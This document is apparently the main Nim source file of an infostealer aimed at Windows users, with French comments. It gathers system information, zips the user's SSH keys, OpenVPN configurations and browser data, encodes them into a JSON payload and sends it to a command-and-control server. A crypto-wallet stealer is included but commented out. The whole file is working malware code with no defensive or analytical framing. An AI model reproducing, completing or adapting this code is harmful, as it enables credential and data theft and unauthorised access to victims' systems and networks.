import os, strutils, times, json, base64
import winim/lean

import crypto_wallets/wallet_stealer
import ssh_stealer/ssh_stealer
import system_info/system_info
import vpn_stealer/vpn_stealer
import browser_stealer/browser_stealer
import api/api

proc crypto_wallets_manager()=
  let data = extractAndZipWallets()
  if data != "":
    echo "[+] Wallets extraits: ", data.len, " bytes"
    echo "[+] Dossier: ", getTempDir() & "wallets_" & $getCurrentProcessId()
    echo "[+] ZIP: ", getTempDir() & "wallets_data.zip"
  else:
    echo "[-] Aucun wallet trouvé"

proc ssh_stealer_manager(): JsonNode =
  echo "[*] Extraction des clés SSH"
  echo repeat("=", 50)

  let keys = extractSSHKeys()

  if keys.len == 0:
    echo "[-] Aucune clé SSH trouvée"
    echo "[*] Dossier vérifié: ", getEnv("USERPROFILE") / ".ssh"
    result = %*{}
  else:
    echo "[+] ", keys.len, " fichier(s) trouvé(s):"
    for key in keys:
      let size = getFileSize(key)
      echo "    📁 ", extractFilename(key), " (", size, " bytes)"
    
    let zipData = packSSHKeys()
    if zipData != "":
      echo "\n[+] Archive créée: ", zipData.len, " bytes"
      result = %*{
        "files": [
          {
            "filename": "ssh_keys.zip",
            "data": encode(zipData)
          }
        ]
      }
    else:
      result = %*{}

proc system_info_manager(): JsonNode =
  let info = getSystemInfo()
  return info

proc vpn_stealer_manager(): JsonNode =
  let data = stealOVPNConfigs()
  if data != "":
    echo "[+] VPN configs: ", data.len, " bytes"
    result = %*{
      "vpn_data": encode(data)
    }
  else:
    echo "[-] Aucune config VPN trouvée"
    result = %*{}

proc browser_stealer_manager(): JsonNode =
  echo "[*] Extraction des données navigateur"
  echo repeat("=", 50)
  
  let browserData = extractBrowserData()
  
  if browserData.len > 0:
    echo "[+] Données navigateur extraites: ", browserData.len, " bytes"
    result = %*{
      "browser_data": encode(browserData)
    }
  else:
    echo "[-] Aucune donnée navigateur extraite"
    result = %*{}

proc merge(a, b: JsonNode): JsonNode =
  result = a.copy()
  for k, v in b.pairs:
    if k in result and result[k].kind == JObject and v.kind == JObject:
      result[k] = merge(result[k], v)
    else:
      result[k] = v

when isMainModule:
  # Collecter toutes les données
  let sys_info = system_info_manager()
  let ssh_files = ssh_stealer_manager()
  let vpn_files = vpn_stealer_manager()
  let browser_files = browser_stealer_manager()
  
  # Fusionner tous les JSON
  var json_payload = sys_info
  json_payload = merge(json_payload, ssh_files)
  json_payload = merge(json_payload, vpn_files)
  json_payload = merge(json_payload, browser_files)
  
  echo "\n[+] Payload final: ", $json_payload
  echo "[+] Taille: ", ($json_payload).len, " bytes"
  
  # Envoyer au serveur C2
  send_data(json_payload)
  
  # Optionnel : modules séparés à décommenter si besoin
  # crypto_wallets_manager()